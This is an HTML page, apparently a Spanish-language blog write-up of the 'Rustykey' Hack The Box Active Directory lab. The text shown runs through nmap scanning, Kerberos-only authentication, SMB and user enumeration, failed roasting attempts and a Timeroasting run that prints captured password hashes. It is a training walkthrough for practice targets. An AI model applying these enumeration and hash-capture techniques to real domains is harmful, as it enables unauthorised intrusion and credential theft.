@@ -1,0 +1,1102 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Rustykey | Borhub Blog</title>
+<meta name="keywords" content="Hard, ActiveDirectory, NTLM-Deshabilitada, Kerberoasting, Timeroasting, AddSelf, ForceChangePassword, ProtectedObjects, RunasCs, DLL Hijacking, AddAllowedToAct, Resource-Based Constrained Delegation">
+<meta name="description" content="Writeup sobre la máquina Rustykey en Active Directory de dificultad Hard.Durante la fase de reconocimiento se identifica que la autenticación NTLM se encuentra deshabilitada, por lo que todo el ataque se apoya en Kerberos. Mediante enumeración SMB y usuarios con nxc, junto con BloodHound, se descubren relaciones y permisos mal configurados dentro del dominio. Los intentos iniciales de Kerberoasting y AS-REP Roasting no tienen éxito, recurriendo posteriormente a un Timeroasting Attack para avanzar. Aprovechando permisos AddSelf, se añade un equipo al grupo HELPDESK, y con ForceChangePassword se comprometen cuentas adicionales, eliminando además protecciones como Protected Objects del grupo IT. Esto permite pivotar a usuarios como MM.TURNER y posteriormente obtener una shell como ee.reed mediante subida de archivos por SMB y RunasCs.exe. Tras enumerar claves de registro, se explota un DLL Hijacking generando una DLL maliciosa con msfvenom y modificando el registro para lograr escalada de privilegios. Finalmente, abusando del permiso AddAllowedToAct, se explota Resource-Based Constrained Delegation, culminando en el compromiso completo del dominio.">
+<meta name="author" content="Borhub">
+<link rel="canonical" href="https://borhuub.github.io/writeups/rustykey/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.0c6701118f5c7e049c5fa8762210566ca9a5a1174e56560126f872ccc4e942a1.css" integrity="sha256-DGcBEY9cfgScX6h2IhBWbKmloRdOVlYBJvhyzMTpQqE=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="16x16" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="32x32" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="apple-touch-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="mask-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://borhuub.github.io/writeups/rustykey/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://borhuub.github.io/writeups/rustykey/">
+  <meta property="og:site_name" content="Borhub Blog">
+  <meta property="og:title" content="Rustykey">
+  <meta property="og:description" content="Writeup sobre la máquina Rustykey en Active Directory de dificultad Hard.Durante la fase de reconocimiento se identifica que la autenticación NTLM se encuentra deshabilitada, por lo que todo el ataque se apoya en Kerberos. Mediante enumeración SMB y usuarios con nxc, junto con BloodHound, se descubren relaciones y permisos mal configurados dentro del dominio. Los intentos iniciales de Kerberoasting y AS-REP Roasting no tienen éxito, recurriendo posteriormente a un Timeroasting Attack para avanzar. Aprovechando permisos AddSelf, se añade un equipo al grupo HELPDESK, y con ForceChangePassword se comprometen cuentas adicionales, eliminando además protecciones como Protected Objects del grupo IT. Esto permite pivotar a usuarios como MM.TURNER y posteriormente obtener una shell como ee.reed mediante subida de archivos por SMB y RunasCs.exe. Tras enumerar claves de registro, se explota un DLL Hijacking generando una DLL maliciosa con msfvenom y modificando el registro para lograr escalada de privilegios. Finalmente, abusando del permiso AddAllowedToAct, se explota Resource-Based Constrained Delegation, culminando en el compromiso completo del dominio.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:tag" content="Hard">
+    <meta property="article:tag" content="ActiveDirectory">
+    <meta property="article:tag" content="NTLM-Deshabilitada">
+    <meta property="article:tag" content="Kerberoasting">
+    <meta property="article:tag" content="Timeroasting">
+    <meta property="article:tag" content="AddSelf">
+    <meta property="og:image" content="https://borhuub.github.io/logo_machines/rustykey.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://borhuub.github.io/logo_machines/rustykey.png">
+<meta name="twitter:title" content="Rustykey">
+<meta name="twitter:description" content="Writeup sobre la máquina Rustykey en Active Directory de dificultad Hard.Durante la fase de reconocimiento se identifica que la autenticación NTLM se encuentra deshabilitada, por lo que todo el ataque se apoya en Kerberos. Mediante enumeración SMB y usuarios con nxc, junto con BloodHound, se descubren relaciones y permisos mal configurados dentro del dominio. Los intentos iniciales de Kerberoasting y AS-REP Roasting no tienen éxito, recurriendo posteriormente a un Timeroasting Attack para avanzar. Aprovechando permisos AddSelf, se añade un equipo al grupo HELPDESK, y con ForceChangePassword se comprometen cuentas adicionales, eliminando además protecciones como Protected Objects del grupo IT. Esto permite pivotar a usuarios como MM.TURNER y posteriormente obtener una shell como ee.reed mediante subida de archivos por SMB y RunasCs.exe. Tras enumerar claves de registro, se explota un DLL Hijacking generando una DLL maliciosa con msfvenom y modificando el registro para lograr escalada de privilegios. Finalmente, abusando del permiso AddAllowedToAct, se explota Resource-Based Constrained Delegation, culminando en el compromiso completo del dominio.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "https://borhuub.github.io/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Rustykey",
+      "item": "https://borhuub.github.io/writeups/rustykey/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Rustykey",
+  "name": "Rustykey",
+  "description": "Writeup sobre la máquina Rustykey en Active Directory de dificultad Hard.Durante la fase de reconocimiento se identifica que la autenticación NTLM se encuentra deshabilitada, por lo que todo el ataque se apoya en Kerberos. Mediante enumeración SMB y usuarios con nxc, junto con BloodHound, se descubren relaciones y permisos mal configurados dentro del dominio. Los intentos iniciales de Kerberoasting y AS-REP Roasting no tienen éxito, recurriendo posteriormente a un Timeroasting Attack para avanzar. Aprovechando permisos AddSelf, se añade un equipo al grupo HELPDESK, y con ForceChangePassword se comprometen cuentas adicionales, eliminando además protecciones como Protected Objects del grupo IT. Esto permite pivotar a usuarios como MM.TURNER y posteriormente obtener una shell como ee.reed mediante subida de archivos por SMB y RunasCs.exe. Tras enumerar claves de registro, se explota un DLL Hijacking generando una DLL maliciosa con msfvenom y modificando el registro para lograr escalada de privilegios. Finalmente, abusando del permiso AddAllowedToAct, se explota Resource-Based Constrained Delegation, culminando en el compromiso completo del dominio.",
+  "keywords": [
+    "Hard", "ActiveDirectory", "NTLM-Deshabilitada", "Kerberoasting", "Timeroasting", "AddSelf", "ForceChangePassword", "ProtectedObjects", "RunasCs", "DLL Hijacking", "AddAllowedToAct", "Resource-Based Constrained Delegation"
+  ],
+  "articleBody": "As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: rr.parker / 8#t5HE8L!W3A\nReconocimiento ❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.75 -oG ports Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-01 05:42 +0200 Initiating SYN Stealth Scan at 05:42 Scanning 10.10.11.75 [65535 ports] Discovered open port 445/tcp on 10.10.11.75 Discovered open port 135/tcp on 10.10.11.75 Discovered open port 53/tcp on 10.10.11.75 Discovered open port 139/tcp on 10.10.11.75 Discovered open port 47001/tcp on 10.10.11.75 Discovered open port 49673/tcp on 10.10.11.75 Discovered open port 49674/tcp on 10.10.11.75 Discovered open port 88/tcp on 10.10.11.75 Discovered open port 49670/tcp on 10.10.11.75 Discovered open port 49669/tcp on 10.10.11.75 Discovered open port 49671/tcp on 10.10.11.75 Discovered open port 49698/tcp on 10.10.11.75 Discovered open port 389/tcp on 10.10.11.75 Discovered open port 49665/tcp on 10.10.11.75 Discovered open port 49749/tcp on 10.10.11.75 Discovered open port 464/tcp on 10.10.11.75 Discovered open port 49677/tcp on 10.10.11.75 Discovered open port 593/tcp on 10.10.11.75 Discovered open port 49666/tcp on 10.10.11.75 Discovered open port 5985/tcp on 10.10.11.75 Discovered open port 49664/tcp on 10.10.11.75 Discovered open port 636/tcp on 10.10.11.75 Discovered open port 3269/tcp on 10.10.11.75 Discovered open port 9389/tcp on 10.10.11.75 Discovered open port 49667/tcp on 10.10.11.75 Discovered open port 3268/tcp on 10.10.11.75 Completed SYN Stealth Scan at 05:42, 10.71s elapsed (65535 total ports) Nmap scan report for 10.10.11.75 Host is up, received user-set (0.035s latency). Scanned at 2025-07-01 05:42:07 CEST for 10s Not shown: 65496 closed tcp ports (reset), 13 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 47001/tcp open winrm syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49665/tcp open unknown syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49669/tcp open unknown syn-ack ttl 127 49670/tcp open unknown syn-ack ttl 127 49671/tcp open unknown syn-ack ttl 127 49673/tcp open unknown syn-ack ttl 127 49674/tcp open unknown syn-ack ttl 127 49677/tcp open unknown syn-ack ttl 127 49698/tcp open unknown syn-ack ttl 127 49749/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 10.78 seconds Raw packets sent: 66648 (2.933MB) | Rcvd: 65522 (2.621MB) Nos copiamos los puertos al portapapeles:\n❯ ports.py ports 🔍 Puertos encontrados: ➜ 53 ➜ 88 ➜ 135 ➜ 139 ➜ 389 ➜ 445 ➜ 464 ➜ 593 ➜ 636 ➜ 3268 ➜ 3269 ➜ 5985 ➜ 9389 ➜ 47001 ➜ 49664 ➜ 49665 ➜ 49666 ➜ 49667 ➜ 49669 ➜ 49670 ➜ 49671 ➜ 49673 ➜ 49674 ➜ 49677 ➜ 49698 ➜ 49749 ¡Puertos copiados en el portapapeles! Escaneo de servicios corriendo tras los puertos:\n❯ sudo nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49673,49674,49677,49698,49749 10.10.11.75 -oG targeted Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-01 05:46 +0200 Nmap scan report for rustykey.htb (10.10.11.75) Host is up (0.11s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-01 04:46:59Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49671/tcp open msrpc Microsoft Windows RPC 49673/tcp open msrpc Microsoft Windows RPC 49674/tcp open msrpc Microsoft Windows RPC 49677/tcp open msrpc Microsoft Windows RPC 49698/tcp open msrpc Microsoft Windows RPC 49749/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_smb2-time: Protocol negotiation failed (SMB2) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 193.78 seconds Autenticación NTLM deshabilitada Intentando enumerar las carpetas compartidas y usuarios, nos encontramos con un error llamado STATUS_NOT_SUPPORTED.\n❯ nxc smb 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A' --users SMB 10.10.11.75 445 10.10.11.75 [*] x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False) SMB 10.10.11.75 445 10.10.11.75 [-] 10.10.11.75\\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED ❯ nxc smb 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A' --shares SMB 10.10.11.75 445 10.10.11.75 [*] x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False) SMB 10.10.11.75 445 10.10.11.75 [-] 10.10.11.75\\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED ❯ nxc smb 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A' SMB 10.10.11.75 445 10.10.11.75 [*] x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False) SMB 10.10.11.75 445 10.10.11.75 [-] 10.10.11.75\\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED ❯ nxc ldap 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A' LDAP 10.10.11.75 389 DC [*] None (name:DC) (domain:rustykey.htb) LDAP 10.10.11.75 389 DC [-] rustykey.htb\\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED Esto parece indicar que tenemos la autenticación por NTLM desactivada. Entonces probamos a autenticar-nos mediante Kerberos con la opción (-k). Y ya podemos autenticar-nos.\n❯ nxc ldap 10.10.11.75 -u 'rr.parker' -p '8#t5HE8L!W3A' -k LDAP 10.10.11.75 389 DC [*] None (name:DC) (domain:rustykey.htb) LDAP 10.10.11.75 389 DC [+] rustykey.htb\\rr.parker:8#t5HE8L!W3A Por el momento parece que vamos a tenernos que autenticar-nos mediante los Tickets Garanting Ticket (TGT) ya que o el usuario actual tiene la autenticación NTLM deshabilitada o quizá todos los usuarios del sistema.\nPrimero empezamos configurando el archivo krb5.conf para que cuando nos intentemos autenticar mediante Kerberos pueda encontrar el Key Distribution Center (KDC).\n[libdefaults] default_realm = RUSTYKEY.HTB ticket_lifetime = 24h renew_lifetime = 7d forwardable = true rdns = false [realms] RUSTYKEY.HTB = { kdc = DC.rustykey.htb admin_server = DC.rustykey.htb default_domain = rustykey.htb } [domain_realm] .rustykey.htb = RUSTYKEY.HTB rustykey.htb = RUSTYKEY.HTB Una vez configurado, con la herramienta getTGT.py vamos a solicitar el Ticket Garanting Ticket (TGT) del usuario rr.parker, que nos devolverá un ticket en formato .ccache que luego exportaremos con la variable KRB5CCNAME.\n❯ getTGT.py rustykey.htb/rr.parker:'8#t5HE8L!W3A' -dc-ip 10.10.11.75 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in rr.parker.ccache ❯ export KRB5CCNAME=/home/borhub/Workspace/HTB/RustyKey/rr.parker.ccache ❯ klist Ticket cache: FILE:/home/borhub/Workspace/HTB/RustyKey/rr.parker.ccache Default principal: rr.parker@RUSTYKEY.HTB Valid starting Expires Service principal 01/07/25 07:34:33 01/07/25 17:34:33 krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB Enumeración SMB + Módulo Spider_plus - nxc Ahora haciendo uso de la variable FQDN le indicamos que su valor sea el FQDN del DC, en este caso, DC.rustykey.htb.\n❯ export FQDN=DC.rustykey.htb Una vez hecho esto, vamos a usar la opción --use-kcache de nxc para hacer uso de nuestro TGT (.ccache).\n❯ nxc smb \"$FQDN\" --use-kcache --shares SMB DC.rustykey.htb 445 DC [*] x64 (name:DC) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False) SMB DC.rustykey.htb 445 DC [+] RUSTYKEY.HTB\\rr.parker from ccache SMB DC.rustykey.htb 445 DC [*] Enumerated shares SMB DC.rustykey.htb 445 DC Share Permissions Remark SMB DC.rustykey.htb 445 DC ----- ----------- ------ SMB DC.rustykey.htb 445 DC ADMIN$ Remote Admin SMB DC.rustykey.htb 445 DC C$ Default share SMB DC.rustykey.htb 445 DC IPC$ READ Remote IPC SMB DC.rustykey.htb 445 DC NETLOGON READ Logon server share SMB DC.rustykey.htb 445 DC SYSVOL READ Logon server share Ahora haciendo uso del modulo spider_plus se guardarán todas las rutas disponibles dentro de las carpetas en un archivo JSON para si poder revisarlos directamente.\n❯ nxc smb 10.10.11.75 \"$FQDN\" --use-kcache -M spider_plus SMB 10.10.11.75 445 10.10.11.75 [*] x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False) SMB DC.rustykey.htb 445 DC [*] x64 (name:DC) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False) SMB DC.rustykey.htb 445 DC [+] RUSTYKEY.HTB\\rr.parker from ccache SPIDER_PLUS DC.rustykey.htb 445 DC [*] Started module spidering_plus with the following options: SPIDER_PLUS DC.rustykey.htb 445 DC [*] DOWNLOAD_FLAG: False SPIDER_PLUS DC.rustykey.htb 445 DC [*] STATS_FLAG: True SPIDER_PLUS DC.rustykey.htb 445 DC [*] EXCLUDE_FILTER: ['print$', 'ipc$'] SPIDER_PLUS DC.rustykey.htb 445 DC [*] EXCLUDE_EXTS: ['ico', 'lnk'] SPIDER_PLUS DC.rustykey.htb 445 DC [*] MAX_FILE_SIZE: 50 KB SPIDER_PLUS DC.rustykey.htb 445 DC [*] OUTPUT_FOLDER: /home/borhub/.nxc/modules/nxc_spider_plus SMB DC.rustykey.htb 445 DC [*] Enumerated shares SMB DC.rustykey.htb 445 DC Share Permissions Remark SMB DC.rustykey.htb 445 DC ----- ----------- ------ SMB DC.rustykey.htb 445 DC ADMIN$ Remote Admin SMB DC.rustykey.htb 445 DC C$ Default share SMB DC.rustykey.htb 445 DC IPC$ READ Remote IPC SMB DC.rustykey.htb 445 DC NETLOGON READ Logon server share SMB DC.rustykey.htb 445 DC SYSVOL READ Logon server share SPIDER_PLUS DC.rustykey.htb 445 DC [+] Saved share-file metadata to \"/home/borhub/.nxc/modules/nxc_spider_plus/DC.rustykey.htb.json\". SPIDER_PLUS DC.rustykey.htb 445 DC [*] SMB Shares: 5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL) SPIDER_PLUS DC.rustykey.htb 445 DC [*] SMB Readable Shares: 3 (IPC$, NETLOGON, SYSVOL) SPIDER_PLUS DC.rustykey.htb 445 DC [*] SMB Filtered Shares: 1 SPIDER_PLUS DC.rustykey.htb 445 DC [*] Total folders found: 23 SPIDER_PLUS DC.rustykey.htb 445 DC [*] Total files found: 5 SPIDER_PLUS DC.rustykey.htb 445 DC [*] File size average: 1.63 KB SPIDER_PLUS DC.rustykey.htb 445 DC [*] File size min: 23 B SPIDER_PLUS DC.rustykey.htb 445 DC [*] File size max: 4.58 KB Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00 Y ahora viendo el archivo que nos ha creado el escaneo podemos revisar las rutas encontradas en el SMB. Pero no nos interesa nada de lo encontrado:\n❯ cat /home/borhub/.nxc/modules/nxc_spider_plus/DC.rustykey.htb.json | jq { \"NETLOGON\": {}, \"SYSVOL\": { \"rustykey.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI\": { \"atime_epoch\": \"2024-12-28 23:38:26\", \"ctime_epoch\": \"2024-12-27 01:52:32\", \"mtime_epoch\": \"2024-12-28 23:38:26\", \"size\": \"23 B\" }, \"rustykey.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf\": { \"atime_epoch\": \"2024-12-28 23:38:26\", \"ctime_epoch\": \"2024-12-27 01:52:32\", \"mtime_epoch\": \"2024-12-28 23:38:26\", \"size\": \"800 B\" }, \"rustykey.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol\": { \"atime_epoch\": \"2024-12-27 01:59:39\", \"ctime_epoch\": \"2024-12-27 01:59:39\", \"mtime_epoch\": \"2024-12-28 23:37:36\", \"size\": \"2.73 KB\" }, \"rustykey.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI\": { \"atime_epoch\": \"2025-06-25 00:59:55\", \"ctime_epoch\": \"2024-12-27 01:52:32\", \"mtime_epoch\": \"2025-06-25 00:59:55\", \"size\": \"23 B\" }, \"rustykey.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf\": { \"atime_epoch\": \"2025-06-25 00:59:55\", \"ctime_epoch\": \"2024-12-27 01:52:33\", \"mtime_epoch\": \"2025-06-25 00:59:55\", \"size\": \"4.58 KB\" } } } Enumeración Usuarios - nxc Ahora hacemos lo mismo que en la anterior enumeración pero usando el parámetro --users.\n❯ nxc smb \"$FQDN\" --use-kcache --users SMB DC.rustykey.htb 445 DC [*] x64 (name:DC) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False) SMB DC.rustykey.htb 445 DC [+] RUSTYKEY.HTB\\rr.parker from ccache SMB DC.rustykey.htb 445 DC -Username- -Last PW Set- -BadPW- -Description- SMB DC.rustykey.htb 445 DC Administrator 2025-06-04 22:52:22 0 Built-in account for administering the computer/domain SMB DC.rustykey.htb 445 DC Guest 0 Built-in account for guest access to the computer/domain SMB DC.rustykey.htb 445 DC krbtgt 2024-12-27 00:53:40 0 Key Distribution Center Service Account SMB DC.rustykey.htb 445 DC rr.parker 2025-06-04 22:54:15 0 SMB DC.rustykey.htb 445 DC mm.turner 2024-12-27 10:18:39 0 SMB DC.rustykey.htb 445 DC bb.morgan 2025-07-01 05:46:40 0 SMB DC.rustykey.htb 445 DC gg.anderson 2025-07-01 05:46:40 0 SMB DC.rustykey.htb 445 DC dd.ali 2025-07-01 05:46:40 0 SMB DC.rustykey.htb 445 DC ee.reed 2025-07-01 05:46:40 0 SMB DC.rustykey.htb 445 DC nn.marcos 2024-12-27 11:34:50 0 SMB DC.rustykey.htb 445 DC backupadmin 2024-12-30 00:30:18 0 SMB DC.rustykey.htb 445 DC [*] Enumerated 11 local users: RUSTYKEY Ahora vamos a guardarnos todos estos usuarios en una lista llamada users.txt.\n❯ cat users.txt ───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: users.txt ───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ SMB DC.rustykey.htb 445 DC Administrator 2025-06-04 22:52:22 0 Built-in account for administering the computer/domain 2 │ SMB DC.rustykey.htb 445 DC Guest 0 Built-in account for guest access to the computer/domain 3 │ SMB DC.rustykey.htb 445 DC krbtgt 2024-12-27 00:53:40 0 Key Distribution Center Service Account 4 │ SMB DC.rustykey.htb 445 DC rr.parker 2025-06-04 22:54:15 0 5 │ SMB DC.rustykey.htb 445 DC mm.turner 2024-12-27 10:18:39 0 6 │ SMB DC.rustykey.htb 445 DC bb.morgan 2025-07-01 05:46:40 0 7 │ SMB DC.rustykey.htb 445 DC gg.anderson 2025-07-01 05:46:40 0 8 │ SMB DC.rustykey.htb 445 DC dd.ali 2025-07-01 05:46:40 0 9 │ SMB DC.rustykey.htb 445 DC ee.reed 2025-07-01 05:46:40 0 10 │ SMB DC.rustykey.htb 445 DC nn.marcos 2024-12-27 11:34:50 0 11 │ SMB DC.rustykey.htb 445 DC backupadmin 2024-12-30 00:30:18 0 ───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── ❯ cat users.txt | awk '{print $5}' | sponge users.txt ❯ cat users.txt ───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: users.txt ───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ Administrator 2 │ Guest 3 │ krbtgt 4 │ rr.parker 5 │ mm.turner 6 │ bb.morgan 7 │ gg.anderson 8 │ dd.ali 9 │ ee.reed 10 │ nn.marcos 11 │ backupadmin ───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── Kerberoasting Attack and AS-REP Roast Attack - GetNPUsers (FAILED) Primero y como tenemos credenciales válidas del dominio vamos a intentar hacer el ataque Kerberoasting. En el cual solicitamos el Ticket Garanting Service (TGS) a las cuentas del dominio que tengan asignadas un servicePrincipalName (SPN).\nEn este caso vemos que no se detecto ninguna cuanta con el SPN asignado con lo cual no nos saco ninguna entrada.\n❯ GetNPUsers.py -request -dc-ip 10.10.11.75 -dc-host DC rustykey.htb/rr.parker -k -no-pass -outputfile kerberoasting.hashes Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies No entries found! Luego intentamos el ataque AS-REP Roast que consiste en solicitar un Ticket Garanting Ticket (TGT) a los usuarios que tenemos en la lista users.txt y que tengas habilitada la flag DONT_REQ_PREAUTH de Kerberos.\nComo ninguno de los usuarios tenia dicha flag activada, no se pudo conseguir el objetivo de obtener el TGT sin autenticación previa.\n❯ GetNPUsers.py -dc-ip 10.10.11.75 rustykey.htb/ -no-pass -usersfile users.txt -outputfile kerberoasting.hashes Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] User rr.parker doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User mm.turner doesn't have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type) [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked) [-] User dd.ali doesn't have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type) [-] User nn.marcos doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User backupadmin doesn't have UF_DONT_REQUIRE_PREAUTH set Timeroasting Attack - Timeroast.py Haciendo uso del mecanismo de autenticación NTP, como atacantes no autorizados podemos hacer peticiones para recibir los hash de las contraseñas.\nTimeroasting\n❯ /opt/Herramientas/Timeroast/timeroast.py 10.10.11.75 | tee ntp-hashes.txt 1000:$sntp-ms$c5ef4f46dd337b4fe8532de0513006b8$1c0111e900000000000a0dbf4c4f434cec0ed0a3e311f779e1b8428bffbfcd0aec0ee2c39ae0b765ec0ee2c39ae0ddfb 1103:$sntp-ms$eb1665fbff280dda014df6c8488365d9$1c0111e900000000000a0dbf4c4f434cec0ed0a3e48fd84fe1b8428bffbfcd0aec0ee2c4346ef226ec0ee2c4346f27d6 1104:$sntp-ms$fb44b5aae79f17241e2309266e8d43d0$1c0111e900000000000a0dbf4c4f434cec0ed0a3e244eff4e1b8428bffbfcd0aec0ee2c4363c9689ec0ee2c4363cd49c 